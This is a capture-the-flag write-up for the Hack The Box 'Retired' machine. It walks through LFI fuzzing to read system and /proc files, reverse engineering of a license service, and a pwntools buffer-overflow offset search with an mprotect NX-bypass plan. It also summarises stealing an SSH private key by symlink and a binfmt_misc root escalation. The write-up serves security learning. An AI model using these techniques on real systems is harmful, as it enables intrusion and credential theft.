# Retired

## Summary

Nmap finds SSH and an Nginx server. The website has a `page` GET parameter, which we fuzz and find a beta page as well as an LFI exploit. The beta page upload a file to `activate_license.php`, which we leak the source code of using the LFI exploit. `activate_license.php` will send the uploaded file to a service running on port `1337`. Since we can access files on the system, we read `/proc/sched_debug` and see that `/usr/bin/activate_license` is the program on port `1337`. We download it so we can reverse engineer it.

Decompiling `activate_license` with [Ghidra](https://ghidra-sre.org/) reveals a buffer overflow exploit with the data we can upload to it. We use gdb with the [peda](https://github.com/longld/peda) extension to debug the program and send a pattern using [pwntools](https://github.com/Gallopsled/pwntools) to determine the offset based on the overwritten registers. The binary has the non-executable stack protection enabled, but we can use `sys_mprotect` to turn off this protection using an approach similar to [this guide](https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/). `mprotect()` changes the access protections for the calling process's memory pages. We need to tell `mprotect()` the start of the stack, the length of the stack, and the protection mode (RWE) to apply to that area of memory. This will make the entire stack executable. To get these addresses, we use the `/proc/$PID/maps` filesystem through the LFI exploit. Finally, we use `msfvenom` to generate some basic shellcode. Our final exploit is in [exploit.py](exploit.py).

Running the [exploit.py](exploit.py) will get us a shell as `www-data`. In the `/var/www` directory we notice some ZIP files being generated every minute. From [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), we learn that there is a system timer that runs `website_backup.service` every minute, which runs as the `dev` user and it creates a ZIP file from `/var/www/html`. So, we create a symbolic link to `dev`'s SSH private key inside of `/var/www/html`. Then, we unzip the created ZIP file and SSH as `dev` using the private key. This gets us the `user.txt` flag.

The privilege escalation part of this box is pretty unique. In the `/home/dev/emuemu/` directory we find a `reg_helper` binary and its source code. This binary takes input and writes it to `/proc/sys/fs/binfmt_misc/register`. That file can only be written to by `root`, but from the `Makefile` we see that the binary at `/usr/lib/emuemu/reg_helper` has the `cap_dac_override` capability, so it bypasses all file write checks. The vulnerability we are going to exploit is pretty cool and these resources are amazing at explaining it: [What is SUID? Shadow SUID for Privilege Persistence: Part 1](https://www.sentinelone.com/blog/shadow-suid-for-privilege-persistence-part-1/) and [SUID Linux: Shadow SUID for Privilege Persistence: Part 2](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/).

From those articles (above): When we run a command on linux, "the kernel reads the first 128 characters of the file. It then iterates over the registered binary-format-handlers to determine which handler should be used. That way, when we execute a file that begins with a #! shebang, the kernel knows it is a script, and the binfmt_script handler is used to find the relevant interpreter (as indicated after the shebang). Similarly, when the file begins with x7fELF, the kernel knows it is a regular Linux binary, and the binfmt_elf handler is used to load the binary into the elf interpreter."

We can use [toffan/binfmt_misc](https://github.com/toffan/binfmt_misc) to exploit the ability to write to `/proc/sys/fs/binfmt_misc/register`. The script will register a new interpreter with `binfmt_misc` linked to the magic bytes of a random SUID binary. That new interpreter will run `/bin/sh`. Thus, when that random SUID binary is executed, Linux will find it's magic bytes registered with `binfmt_misc` and execute our interpreter with the permissions of the file executed. Since the file executed is SUID, we will get a root shell.

After [a few modifications to the exploit](binfmt_rootkit), we run it and get the `root.txt` flag.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.154 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.154`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Website (Port `80`)

Let's check out the website since that's the only thing we have to work with (other than SSH):

![](screenshots/Screenshot%202022-08-04%20at%2018-42-33%20Agency%20-%20Start%20Bootstrap%20Theme.png)

The URL is `http://10.10.11.154/index.php?page=default.html`, so we have a `page` parameter to play with.

We check for a local file inclusion (LFI) exploit on the `page` parameter by running `ffuf -ic -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://10.10.11.154/index.php\?page\=FUZZ -fs 0`:

```
etc/fstab              [Status: 302, Size: 327, Words: 13, Lines: 9, Duration: 30ms]
/etc/passwd             [Status: 302, Size: 1488, Words: 14, Lines: 29, Duration: 31ms]
/etc/hosts.deny         [Status: 302, Size: 711, Words: 128, Lines: 18, Duration: 32ms]
/etc/crontab            [Status: 302, Size: 1042, Words: 181, Lines: 23, Duration: 33ms]
/etc/issue              [Status: 302, Size: 27, Words: 5, Lines: 3, Duration: 34ms]
/etc/hosts.allow        [Status: 302, Size: 411, Words: 82, Lines: 11, Duration: 36ms]
/etc/hosts              [Status: 302, Size: 154, Words: 5, Lines: 8, Duration: 36ms]
/etc/motd               [Status: 302, Size: 286, Words: 36, Lines: 8, Duration: 24ms]
/etc/motd               [Status: 302, Size: 286, Words: 36, Lines: 8, Duration: 24ms]
/etc/mtab               [Status: 302, Size: 1466, Words: 101, Lines: 21, Duration: 28ms]
/etc/passwd             [Status: 302, Size: 1488, Words: 14, Lines: 29, Duration: 27ms]
/etc/network/interfaces [Status: 302, Size: 337, Words: 32, Lines: 15, Duration: 29ms]
/etc/networks           [Status: 302, Size: 60, Words: 1, Lines: 5, Duration: 30ms]
/etc/profile            [Status: 302, Size: 769, Words: 157, Lines: 35, Duration: 31ms]
/etc/resolv.conf        [Status: 302, Size: 38, Words: 3, Lines: 3, Duration: 31ms]
/etc/ssh/sshd_config    [Status: 302, Size: 3338, Words: 300, Lines: 128, Duration: 30ms]
/etc/ssh/ssh_config     [Status: 302, Size: 1650, Words: 249, Lines: 54, Duration: 32ms]
/proc/filesystems       [Status: 302, Size: 347, Words: 1, Lines: 29, Duration: 28ms]
/proc/cpuinfo           [Status: 302, Size: 2320, Words: 283, Lines: 55, Duration: 30ms]
/proc/modules           [Status: 302, Size: 3109, Words: 301, Lines: 61, Duration: 30ms]
/proc/stat              [Status: 302, Size: 1194, Words: 489, Lines: 11, Duration: 29ms]
/proc/swaps             [Status: 302, Size: 104, Words: 32, Lines: 3, Duration: 29ms]
/proc/mounts            [Status: 302, Size: 1466, Words: 101, Lines: 21, Duration: 30ms]
/proc/ioports           [Status: 302, Size: 1537, Words: 313, Lines: 59, Duration: 30ms]
/proc/interrupts        [Status: 302, Size: 4180, Words: 1938, Lines: 68, Duration: 30ms]
/proc/meminfo           [Status: 302, Size: 1419, Words: 493, Lines: 52, Duration: 31ms]
/proc/version           [Status: 302, Size: 184, Words: 21, Lines: 2, Duration: 31ms]
/proc/self/net/arp      [Status: 302, Size: 156, Words: 78, Lines: 3, Duration: 32ms]
/var/run/utmp           [Status: 302, Size: 1536, Words: 1, Lines: 3, Duration: 29ms]
/var/log/wtmp           [Status: 302, Size: 12288, Words: 2, Lines: 11, Duration: 31ms]
/var/log/lastlog        [Status: 302, Size: 292584, Words: 1, Lines: 2, Duration: 29ms]
:: Progress: [257/257] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

So, we can read files on the system.

Let's scan for other directories by running `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.10.11.154/FUZZ`:

```
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
assets                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 33ms]
css                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 26ms]
js                      [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 29ms]
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
:: Progress: [87651/87651] :: Job [1/1] :: 1482 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

Nothing unusual here.

We can fuzz for different pages using `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.10.11.154/index.php\?page\=FUZZ.html -fs 0`:

```
default                 [Status: 200, Size: 11414, Words: 4081, Lines: 189, Duration: 36ms]
beta                    [Status: 200, Size: 4144, Words: 1137, Lines: 73, Duration: 25ms]
:: Progress: [87651/87651] :: Job [1/1] :: 1399 req/sec :: Duration: [0:01:17] :: Errors: 4 ::
```

Let's look at the `beta` page located at `http://10.10.11.154/index.php?page=beta.html`:

![](screenshots/Screenshot%202022-08-04%20at%2018-47-28%20Agency%20-%20Start%20Bootstrap%20Theme.png)

From the source code we see that the form action is `activate_license.php`. With the LFI exploit we can get the source of this file by running `curl http://10.10.11.154/index.php\?page\=activate_license.php`:

```php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

This script will open a connection with a service running on port `1337` locally on the box. Then, it will send our uploaded file to that service. So, we need to get information about that service.

Searching online for "lfi find running processes" finds [this article](https://tun0.blog/posts/pidlfi/), which mentions this command:

```bash
$ for i in $(seq 1 5000); do echo $i >> pid.txt; done && \
ffuf -c -w pid.txt:FUZZ -u http://10.0.0.19/lfi.php?lang=/proc/FUZZ/cmdline -fw 1
```

We modify it slightly to create this:

```bash
$ for i in $(seq 1 5000); do echo $i >> pid.txt; done && \
ffuf -c -w pid.txt:FUZZ -u http://10.10.11.154/index.php\?page\=/proc/FUZZ/cmdline -fs 0

406                     [Status: 302, Size: 31, Words: 1, Lines: 1, Duration: 26ms]
582                     [Status: 302, Size: 49, Words: 3, Lines: 1, Duration: 30ms]
583                     [Status: 302, Size: 49, Words: 3, Lines: 1, Duration: 30ms]
:: Progress: [5000/5000] :: Job [1/1] :: 1434 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

So, in the first 5000 PIDs we have `406`, `582`, and `583`. We can now run `curl http://10.10.11.154/index.php\?page\=/proc/406/cmdline --output -` and see that the program was launched with the command `/usr/bin/activate_license 1337`.

Another approach would have been to look at the contents of the `/proc/sched_debug` file, since that also shows information about running processes.

Let's run `curl http://10.10.11.154/index.php\?page\=/usr/bin/activate_license --output activate_license` to download that binary: [activate_license](activate_license).

## Foothold

Running `file activate_license` shows the following:

```
activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped
```

We can see the binary security settings with [checksec](https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec) from [pwntools](https://github.com/Gallopsled/pwntools):

```
$ checksec activate_license
[*] 'activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We decompile the binary using [Ghidra](https://ghidra-sre.org/). Here is the decompiled `activate_license` function:

```c++

void activate_license(int sockfd)

{
  int iVar1;
  ssize_t sVar2;
  int *piVar3;
  char *pcVar4;
  sqlite3_stmt *stmt;
  sqlite3 *db;
  uint32_t msglen;
  char buffer [512];
  
  sVar2 = read(sockfd,&msglen,4);
  if (sVar2 == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  msglen = ntohl(msglen);
  printf("[+] reading %d bytes\n",(ulong)msglen);
  sVar2 = read(sockfd,buffer,(ulong)msglen);
  if (sVar2 == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  iVar1 = sqlite3_open("license.sqlite",&db);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  sqlite3_busy_timeout(db,2000);
  iVar1 = sqlite3_exec(db,
                       "CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,    license_key TEXT)"
                       ,0,0,0);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_prepare_v2(db,"INSERT INTO license (license_key) VALUES (?)",0xffffffff,&stmt,0);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_bind_text(stmt,1,buffer,0x200,0);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_step(stmt);
  if (iVar1 != 0x65) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_reset(stmt);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_finalize(stmt);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_close(db);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  printf("[+] activated license: %s\n",buffer);
  return;
}

```

There is a buffer overflow in this function. The buffer is set to 512 bytes, but then the line `sVar2 = read(sockfd,buffer,(ulong)msglen);` will read `msglen` bytes from the socket into the buffer. So, if we upload a license to the program that is larger than 512 bytes, we should be writing onto the stack. For a normal buffer overflow, we would be able to add some shell code, create a [NOP sled](https://stackoverflow.com/a/14760699), and then overwrite the return address with the address of our shell code. The problem is that we have "NX enabled" according to `checksec`. NX stands for "no execution," so even if we were to return to shell code, it would not be executed.

Additionally, `RELRO` is set to full: "Full RELRO makes the entire GOT read-only which removes the ability to perform a "GOT overwrite" attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run" ([source](https://ctf101.org/binary-exploitation/relocation-read-only/)). Therefore, we cannot perform an attack similar to the one from [PicoCTF 2019's GoT](https://picoctf2019.haydenhousen.com/binary-exploitation/got). Finally, PIE is enabled: "PIE stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address. This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are" ([source](https://ir0nstone.gitbook.io/notes/types/stack/pie)).

We are going to use GDB to get the offset for this buffer overflow attack. There are many projects that exist to fill in the gaps in the GDB debugger: [pwndbg](https://github.com/pwndbg/pwndbg), [peda](https://github.com/longld/peda), [GEF](https://github.com/hugsy/gef). For some reason, when using normal GDB or [GEF](https://github.com/hugsy/gef), GDB doesn't pick up the `SIGSEGV, Segmentation fault` when we send our input. Thus, we cannot read the RSP. However, when I used [peda](https://github.com/longld/peda), it worked! So, use peda. This issue probably happens because the program forks when it receives a request. According to [this StackOverflow answer](https://stackoverflow.com/a/15127892), we can run `set follow-fork-mode child`, but this doesn't work (unless peda is used of course).

To exploit this buffer overflow vulnerability, we need to get the offset, which cannot be easily automated like usual since the program receives input via a port. Launch GDB-PEDA with `gdb --args ./activate_license 1338` and run it with `run`. Then, run the below script, which uses pwntools to connect to the program and send a pattern that can be used to determine the offset (this can also be done with `pattern_create 700` in GDB-PEDA, but then the request needs to be sent manually):

```python
from pwn import *

io = remote('127.0.0.1', 1338)

payload_size = 700
size_value = p32(payload_size, endian='big')  # 32 bit big endian

payload = [size_value, cyclic(payload_size)]
payload = b"".join(payload)

io.send(payload)
```

Upon running the above script, GDB-PEDA should produce the following:

```
[+] accepted client connection from 127.0.0.1:53989
[Attaching after Thread 0x7ffff7b0a480 (LWP 72309) fork to child process 72392]
[New inferior 2 (process 72392)]
[Detaching after fork from parent process 72309]
[Inferior 1 (process 72309) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] reading 700 bytes
[+] activated license: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag

Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff7b0a480 (LWP 72392)]
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.
[----------------------------------registers-----------------------------------]
RAX: 0x2d4
RBX: 0x5555555557c0 (<__libc_csu_init>: push   r15)
RCX: 0x0
RDX: 0x0
RSI: 0x0
RDI: 0x7fffffffb430 --> 0x7ffff7cc9d90 (<__funlockfile>:        mov    rdi,QWORD PTR [rdi+0x88])
RBP: 0x6661616566616164 ('daafeaaf')
RSP: 0x7fffffffbbc8 ("faafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
RIP: 0x5555555555c0 (<activate_license+643>:    ret)
R8 : 0x0
R9 : 0x7ffff7e030c0 --> 0x0
R10: 0x7ffff7e02fc0 --> 0x0
R11: 0x246
R12: 0x555555555220 (<_start>:  xor    ebp,ebp)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555555b9 <activate_license+636>:       call   0x5555555550b0 <printf@plt>
   0x5555555555be <activate_license+641>:       nop
   0x5555555555bf <activate_license+642>:       leave
=> 0x5555555555c0 <activate_license+643>:       ret
   0x5555555555c1 <main>:       push   rbp
   0x5555555555c2 <main+1>:     mov    rbp,rsp
   0x5555555555c5 <main+4>:     sub    rsp,0x60
   0x5555555555c9 <main+8>:     mov    DWORD PTR [rbp-0x54],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffbbc8 ("faafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
0008| 0x7fffffffbbd0 ("haafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
0016| 0x7fffffffbbd8 ("jaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
0024| 0x7fffffffbbe0 ("laafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
0032| 0x7fffffffbbe8 ("naafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
0040| 0x7fffffffbbf0 ("paafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
0048| 0x7fffffffbbf8 ("raafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
0056| 0x7fffffffbc00 ("taafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00005555555555c0 in activate_license (sockfd=0x4) at activate_license.c:64
64      activate_license.c: No such file or directory.
```

Now, run `x/wx $rsp` to get the RSP, which we overwrote: `0x7fffffffbbc8: 0x66616166`. The value can also be viewed in the output above: `faaf`. Finally, run `python -c 'from pwn import *; print(cyclic_find(unhex("66616166")[::-1]))'` to find the offset of those 4 bytes in the pattern. We get an offset of `520`.

Now for the actual exploit. We are going to use `sys_mprotect` to turn off the NX protection using an approach similar to [this guide](https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/). Other resources: [ROP Exploit – MProtect() and Shellcode](https://failingsilently.wordpress.com/2017/12/17/rop-exploit-mprotect-and-shellcode/) and [ARM Exploitation — Defeating NX By Invoking mprotect() Using ROP](https://infosecwriteups.com/arm-exploitation-defeating-nx-by-invoking-mprotect-using-rop-1450b6667c16).

From the linx man pages, we know that "mprotect() changes the access protections for the calling process's memory pages containing any part of the address range in the interval [addr, addr+len-1]." The function has this syntax: `int mprotect(void *addr, size_t len, int prot);`. We will set the `addr` to the beginning of the stack, `len` to the size of the stack, and `prot` to `0x7`, which stands for RWX. This will make the entire stack executable.

The calling convention for ELF 64 is the following:

* Arguments in RDI, RSI, RDX, RCX, R8, R9
* Return Value in RAX

So we need to put the stack address in the RDI register, the length in the RSI register and the value `0x7` in the RDX register. The [aforementioned guide](https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/) uses [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to do this, which is a great tool, but we we can do it automatically with pwntools.

The issue is we don't have those values. Additionally, the machine probably has ASLR enabled, which makes them randomize each time the program is started. However, due to the LFI exploit, we can read `/proc/$PID/maps`. "Each row in `/proc/$PID/maps` describes a region of contiguous virtual memory in a process or thread" ([source](https://stackoverflow.com/a/1401595)). You can learn more from the [linux kernel documentation](https://www.kernel.org/doc/html/latest/filesystems/proc.html#process-specific-subdirectories) and [this post](https://www.linkedin.com/pulse/hacking-proc-filesystem-memory-arthur-damm).

We can get the maps for process `406`, the `activate_license` process, like so:

```
curl http://10.10.11.154/index.php\?page\=/proc/406/maps
55e0aa5a0000-55e0aa5a1000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
55e0aa5a1000-55e0aa5a2000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
55e0aa5a2000-55e0aa5a3000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55e0aa5a3000-55e0aa5a4000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55e0aa5a4000-55e0aa5a5000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
55e0ab5ba000-55e0ab5db000 rw-p 00000000 00:00 0                          [heap]
7f91a2a27000-7f91a2a29000 rw-p 00000000 00:00 0 
7f91a2a29000-7f91a2a2a000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f91a2a2a000-7f91a2a2c000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f91a2a2c000-7f91a2a2d000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f91a2a2d000-7f91a2a2e000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f91a2a2e000-7f91a2a2f000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f91a2a2f000-7f91a2a36000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f91a2a36000-7f91a2a46000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f91a2a46000-7f91a2a4b000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f91a2a4b000-7f91a2a4c000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f91a2a4c000-7f91a2a4d000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f91a2a4d000-7f91a2a51000 rw-p 00000000 00:00 0 
7f91a2a51000-7f91a2a60000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f91a2a60000-7f91a2afa000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f91a2afa000-7f91a2b93000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f91a2b93000-7f91a2b94000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f91a2b94000-7f91a2b95000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f91a2b95000-7f91a2bba000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f91a2bba000-7f91a2d05000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f91a2d05000-7f91a2d4f000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f91a2d4f000-7f91a2d50000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f91a2d50000-7f91a2d53000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f91a2d53000-7f91a2d56000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f91a2d56000-7f91a2d5a000 rw-p 00000000 00:00 0 
7f91a2d5a000-7f91a2d6a000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f91a2d6a000-7f91a2e62000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f91a2e62000-7f91a2e96000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f91a2e96000-7f91a2e9a000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f91a2e9a000-7f91a2e9d000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f91a2e9d000-7f91a2e9f000 rw-p 00000000 00:00 0 
7f91a2ea4000-7f91a2ea5000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f91a2ea5000-7f91a2ec5000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f91a2ec5000-7f91a2ecd000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f91a2ece000-7f91a2ecf000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f91a2ecf000-7f91a2ed0000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f91a2ed0000-7f91a2ed1000 rw-p 00000000 00:00 0 
7ffd35848000-7ffd35869000 rw-p 00000000 00:00 0                          [stack]
7ffd358d3000-7ffd358d7000 r--p 00000000 00:00 0                          [vvar]
7ffd358d7000-7ffd358d9000 r-xp 00000000 00:00 0                          [vdso]
```

So, from the above output we know that the libc base is at `7f91a2b95000`, the libsqlite3 base is at `7F91A2D5A000`, the stack start is at `7ffd35848000`, and the stack end is at `7ffd35869000`.

We can write a python function to get these values programatically:

```python
def get_addresses(pid):
    r = requests.get(
        f"http://10.10.11.154/index.php?page=/proc/{pid}/maps", allow_redirects=False
    )
    libc_line = re.search("^.*libc.*$", r.text, re.M).group(0)
    libc_base = int(libc_line.split("-")[0], 16)
    libc_path = libc_line.split(" ")[-1]

    libsqlite_line = re.search("^.*libsqlite.*$", r.text, re.M).group(0)
    libsqlite_base = int(libsqlite_line.split("-")[0], 16)
    libsqlite_path = libsqlite_line.split(" ")[-1]

    stack_line = re.search("^.*\[stack\].*$", r.text, re.M).group(0).split("-")
    stack_base = int(stack_line[0], 16)
    stack_end = int(stack_line[1].split()[0], 16)

    return libc_base, libc_path, libsqlite_base, libsqlite_path, stack_base, stack_end
```

The `re.M` flag makes `^` and `$` "match at the start or end of any line within the input string instead of the start or end of the entire string" ([source](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)). We also get the path for libc and libsqlite so we can use them with pwntools automatic gadget finder.

